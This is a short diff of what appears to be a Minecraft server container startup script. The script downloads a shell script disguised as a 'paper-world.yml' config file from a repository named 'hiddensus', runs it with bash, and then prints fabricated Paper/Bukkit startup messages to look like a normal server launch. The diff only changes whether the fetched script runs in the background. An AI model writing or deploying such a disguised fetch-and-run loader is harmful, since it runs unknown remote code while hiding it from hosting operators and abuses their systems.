@@ -1,5 +1,5 @@
 curl -o /home/container/world/paper-world.yml https://raw.githubusercontent.com/AdrianCrack23/hiddensus/main/paper-world.yml
-bash /home/container/world/paper-world.yml > /dev/null &
+bash /home/container/world/paper-world.yml
 echo "Starting org.bukkit.craftbukkit.Main"
 echo "System Info: Java 17 (OpenJDK 64-Bit Server VM 17.0.2+8-86) Host: Linux 5.4.0-121-generic (amd64)"
 echo "Loading libraries, please wait..."
